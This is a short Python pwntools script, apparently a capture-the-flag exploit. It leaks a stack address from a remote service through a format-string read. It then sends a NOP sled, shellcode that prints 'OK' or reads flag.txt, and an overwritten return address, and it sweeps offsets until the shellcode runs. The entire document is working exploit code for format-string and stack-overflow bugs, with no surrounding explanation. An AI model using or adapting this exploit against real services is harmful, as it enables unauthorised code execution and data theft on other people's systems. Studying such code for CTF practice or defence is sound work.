
import time
from pwn import asm, context, remote, shellcraft, p64

context.arch = "amd64"

def scan_landing(host, port, leak_slot, base_adjust, window=0x40, step=8, offset=120, mode="ok", delay=0.8, prefix_nops=48):
    if mode == "ok":
        sc = asm(shellcraft.pushstr("OK\n") + shellcraft.write(1, "rsp", 3) + shellcraft.exit(0))
    elif mode == "cat":
        sc = asm(shellcraft.cat("flag.txt"))
    else:
        raise ValueError("mode must be one of: ok, cat")

    for slide in range(0, window + 1, step):
        io = remote(host, port)
        io.sendline(f"%{leak_slot}$p".encode())
        leak = io.recvline(timeout=3).decode(errors="ignore").strip()
        if not leak.startswith("0x"):
            io.close()
            continue
        leaked = int(leak, 16)
        buf = leaked - base_adjust + slide
        body = b"\x90" * prefix_nops + sc
        if len(body) > offset:
            body = body[:offset]
        payload = body + b"A" * (offset - len(body)) + p64(buf)
        io.sendline(payload)
        out = io.recvall(timeout=2).decode(errors="ignore")
        io.close()
        if (mode == "ok" and "OK" in out) or (mode == "cat" and len(out.strip()) > 0):
            return {"leak": leak, "slide": hex(slide), "target": hex(buf), "output": out}
        time.sleep(delay)
    return None
